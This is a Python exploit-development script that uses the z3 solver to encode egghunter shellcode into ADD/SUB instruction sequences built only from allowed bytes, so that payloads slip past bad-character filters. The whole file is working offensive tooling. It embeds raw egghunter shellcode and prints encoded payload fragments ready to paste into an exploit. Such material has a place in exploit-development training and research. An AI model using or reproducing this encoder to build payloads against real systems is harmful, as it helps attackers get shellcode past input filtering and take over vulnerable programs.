#!/usr/bin/env python3
from z3 import *
import struct

# idea to use z3 taken from https://marcosvalle.github.io/re/exploit/2018/10/05/sub-encoding.html
# poc code expanded to fully encode all shellcode

def solve_zero_eax(good_chars):
	x1 = Int('x1')
	x2 = Int('x2')
	x3 = Int('x3')
	x4 = Int('x4')
	y1 = Int('y1')
	y2 = Int('y2')
	y3 = Int('y3')
	y4 = Int('y4')
	X = BitVec('X', 32)
	Y = BitVec('Y', 32)
	
	s = Solver()
	s.add(X & Y == 0)

	s.add(0x1000000*x1 + 0x10000*x2 + 0x100*x3 + x4 == BV2Int(X))
	s.add(0x1000000*y1 + 0x10000*y2 + 0x100*y3 + y4 == BV2Int(Y))

	constrained_ints = [x1,x2,x3,x4,y1,y2,y3,y4]
	for ci in constrained_ints:
		s.add(Or([ci == ord(i) for i in good_chars]))

	s.check()
	s.model()
	return [s.model()[X].as_long(), s.model()[Y].as_long()]

def solve_sub_encode(b, good_chars):
	x1 = Int('x1')
	x2 = Int('x2')
	x3 = Int('x3')
	x4 = Int('x4')
	y1 = Int('y1')
	y2 = Int('y2')
	y3 = Int('y3')
	y4 = Int('y4')
	z1 = Int('z1')
	z2 = Int('z2')
	z3 = Int('z3')
	z4 = Int('z4')
	X = Int('X')
	Y = Int('Y')
	Z = Int('Z')


	s = Solver()
	s.add(Or(X+Y+Z==b, X+Y+Z==0x100000000 + b))

	s.add(0x1000000*x1 + 0x10000*x2 + 0x100*x3 + x4 == X)
	s.add(0x1000000*y1 + 0x10000*y2 + 0x100*y3 + y4 == Y)
	s.add(0x1000000*z1 + 0x10000*z2 + 0x100*z3 + z4 == Z)

	constrained_ints = [x1,x2,x3,x4,y1,y2,y3,y4,z1,z2,z3,z4]
	for ci in constrained_ints:
		s.add(Or([ci == ord(i) for i in good_chars]))

	s.check()
	s.model()
	return [s.model()[X].as_long(), s.model()[Y].as_long(), s.model()[Z].as_long()]


def solve_add_encode(b, good_chars):
	x1 = Int('x1')
	x2 = Int('x2')
	x3 = Int('x3')
	x4 = Int('x4')
	y1 = Int('y1')
	y2 = Int('y2')
	y3 = Int('y3')
	y4 = Int('y4')
	z1 = Int('z1')
	z2 = Int('z2')
	z3 = Int('z3')
	z4 = Int('z4')
	X = Int('X')
	Y = Int('Y')
	Z = Int('Z')


	s = Solver()
	s.add(Or(X+Y+Z==b, X+Y+Z==0x100000000 + b))

	s.add(0x1000000*x1 + 0x10000*x2 + 0x100*x3 + x4 == X)
	s.add(0x1000000*y1 + 0x10000*y2 + 0x100*y3 + y4 == Y)
	s.add(0x1000000*z1 + 0x10000*z2 + 0x100*z3 + z4 == Z)

	constrained_ints = [x1,x2,x3,x4,y1,y2,y3,y4,z1,z2,z3,z4]
	for ci in constrained_ints:
		s.add(Or([ci == ord(i) for i in good_chars]))

	s.check()
	s.model()
	return [s.model()[X].as_long(), s.model()[Y].as_long(), s.model()[Z].as_long()]


def do_sub_encoding(egghunter, good_chars):
	print("# BEGIN AUTOGENERATED ENCODED EGGHUNTER")
	res = solve_zero_eax(good_chars)
	# 25 is and eax, lv
	print("zero_eax =",b"\x25","+",struct.pack("<I", res[0]),"+",b"\x25","+",struct.pack("<I", res[1]))
	print("encoded_egg_hunter = b''")
	for instruction_block in egghunter:
		print(f"# SUB encoding instructions: {instruction_block.hex()}")
		i = struct.unpack("<I", instruction_block)[0]
		neg = 0xFFFFFFFF - i + 1
		print("# 0xFFFFFFFF - 0x{:x} + 1 = 0x{:x}".format(i, neg)) #carry
		res = solve_sub_encode(neg, good_chars)
		print("encoded_egg_hunter += zero_eax")
		for b in res:
			# 2D is sub eax, lv
			print("#", hex(b))
			print("encoded_egg_hunter +=", b"\x2D", "+", struct.pack("<I", b))
		# push eax
		print("encoded_egg_hunter +=", b'\x50')

	print("# END AUTOGENERATED ENCODED EGGHUNTER")


def do_add_encoding(egghunter, good_chars):
	print("# BEGIN AUTOGENERATED ENCODED EGGHUNTER")
	res = solve_zero_eax(good_chars)
	# 25 is and eax, lv
	print("zero_eax =",b"\x25","+",struct.pack("<I", res[0]),"+",b"\x25","+",struct.pack("<I", res[1]))
	print("encoded_egg_hunter = b''")
	for instruction_block in egghunter:
		print(f"# ADD encoding instructions: {instruction_block.hex()}")
		i = struct.unpack("<I", instruction_block)[0]
		res = solve_add_encode(i, good_chars)
		check = 0
		print("encoded_egg_hunter += zero_eax")
		for b in res:
			print("#", hex(b))
			# 05 is add eax, lv
			print("encoded_egg_hunter +=", b"\x05", "+", struct.pack("<I", b))
		# push eax
		print("encoded_egg_hunter +=", b'\x50')

	print("# END AUTOGENERATED ENCODED EGGHUNTER")

def prep_shellcode(shellcode):
	l = []
	for i in range(0, len(shellcode), 4):
		l.append(shellcode[i:i+4])

	l.reverse()
	return l


# egghunter shellcode, can change this to whatever shellcode you want
shellcode = b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

if len(shellcode) % 4 != 0:
	print(f"Shellcode not divisible by 4, was {len(shellcode)} bytes, pad with 'nops'")
	exit()

egghunter = prep_shellcode(shellcode)

# good chars list, might have to change this
good_chars  = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13"
good_chars += "\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24"
good_chars += "\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x30\x31\x32\x33\x34\x35\x36"
good_chars += "\x37\x38\x39\x3b\x3c\x3d\x3e\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a"
good_chars += "\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b"
good_chars += "\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
good_chars += "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d"
good_chars += "\x7e\x7f"


do_add_encoding(egghunter, good_chars)
do_sub_encoding(egghunter, good_chars)
